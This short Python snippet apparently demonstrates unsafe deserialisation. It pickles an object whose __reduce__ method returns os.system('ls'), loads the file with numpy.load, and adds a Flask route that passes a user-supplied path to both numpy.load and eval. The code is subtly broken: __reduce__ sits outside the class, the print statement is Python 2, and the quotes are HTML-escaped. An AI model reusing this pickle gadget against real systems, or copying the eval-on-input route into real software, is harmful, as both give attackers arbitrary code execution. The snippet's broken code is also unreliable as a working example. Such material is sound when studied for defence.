import numpy
from numpy import __version__
print __version__
import os
import  pickle
class Test(object):
    def __init__(self):
        self.a = 1

def __reduce__(self):
    return (os.system,(&#39;ls&#39;,))

tmpdaa = Test()
with open("a-file.pickle",'wb') as f:
    pickle.dump(tmpdaa,f)
numpy.load('a-file.pickle')

from flask import Flask, request
app = Flask(__name__)
@app.route("/files/<path>")
def analyze_file(path):
  numpy.load(path)
  eval(path)
